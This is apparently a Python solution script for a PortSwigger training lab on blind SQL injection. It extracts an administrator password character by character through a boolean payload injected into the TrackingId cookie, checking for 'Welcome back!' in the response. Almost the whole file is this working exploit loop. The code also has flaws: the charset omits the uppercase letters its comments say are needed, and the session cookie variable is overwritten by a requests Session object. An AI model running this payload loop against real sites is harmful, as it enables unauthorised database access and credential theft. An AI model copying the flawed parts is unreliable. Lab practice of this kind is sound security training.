# Portswigger Lab: Blind SQL injection with conditional responses
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Author: d1Zzy666
# Date: 15-11-2024

"""
Execution path:
+ Identify SQL injection point (MANUAL)
- Charset needs to include lowercase, uppercase characters and numbers.
- Password length is 20 characters.
- Loop through to identify administrator password.
"""

"""
Boolean options:
FALSE - "Welcome back!" is NOT displayed.
TRUE - "Welcome back!" is displayed.
"""

# Libraries & imports etc.
from datetime import datetime
from multiprocessing import Process                                   
import requests
from socketserver import TCPServer
import time
import urllib3                                  # Used to suppress SSL warning

# global variables
labid = "0a9f0072034226de81f8c58200c5002f"              # UPDATE
targetdomain = "web-security-academy.net"
session = "yqorggqNRw25PHFWOdk7njNUmdDDIUIP"            # UPDATE   

charset = "abcdefghijklmnopqrstuvwxyz0123456789"
truetxt = "Welcome back!"

# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Function can be called for printing a line between - aesthetics of output	
def line():
	return "\n--------------------------------------------------------------------------------\n"

# Check current time
def currentTime():
    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")

print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - Portswigger Lab: Blind SQL injection with conditional responses...")
print(line())

# Password retrieval function
def passwdretrieval():
    adminpassword = ""
    position = 1
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving administrator password..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/"
            payload = f"'+and+(select+substring(password,{position},1)+from+Users+where+username%3d'administrator')%3d'{char}'--"
            
            cookies = {"TrackingId": f"5PBUqAnOStqYpJLG{payload}", "session": f"{session}"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
            x = session.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
            if f"{truetxt}" in x.text:
                adminpassword += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"Administrator password: {adminpassword}")
    print("\n")


if __name__ == "__main__":
    passwdretrieval()